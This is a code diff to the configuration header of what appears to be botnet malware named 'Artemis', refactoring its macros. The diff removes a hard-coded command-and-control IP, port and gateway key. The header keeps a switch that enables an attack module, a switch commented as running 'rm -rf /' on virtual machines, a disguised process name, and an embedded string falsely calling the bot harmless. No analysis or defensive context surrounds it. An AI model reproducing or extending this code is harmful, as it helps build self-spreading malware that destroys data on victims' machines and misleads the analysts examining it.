@@ -3,24 +3,16 @@
 #define _GNU_SOURCE
 
 #undef WEAPONIZED // Has attk.c
-#undef FUCKVMS    // rm -rf / on vms
+#undef HURTVMS // rm -rf / on vms
 
 /* Version */
-#define VERSION "1.0"
-
-// CNC information
-#define SERVER_ADRESS "45.32.89.146"
-#define SERVER_PORT 80
-#define TIMEOUT 120 // Time between posts
+#define MAIN_VERSION "1.0"
 
 // Malware name when observeed
-#define PROC_NAME "artemis\0"
-
-// Gateway info
-#define GATE_KEY "KEY"
+#define MAIN_NAME "artemis\0"
 
 // Default readable text in ELF file
-#define BOTINFO "Artemis is a harmless bot that just replicates!"
+#define MAIN_BOTINFO "Artemis is a harmless bot that just replicates!"
 
 /* Normal headers */
 #include <arpa/inet.h>
@@ -44,14 +36,8 @@
 
 /* Type definitons and defines */
 
-#define elif else if
 typedef uint32_t ipv4_t;
 typedef uint16_t port_t;
-
-/* Debug headers */
-#ifdef DEBUG
-#include <stdarg.h>
-#endif
 
 /* Serpent headers */
 #include "func.h"
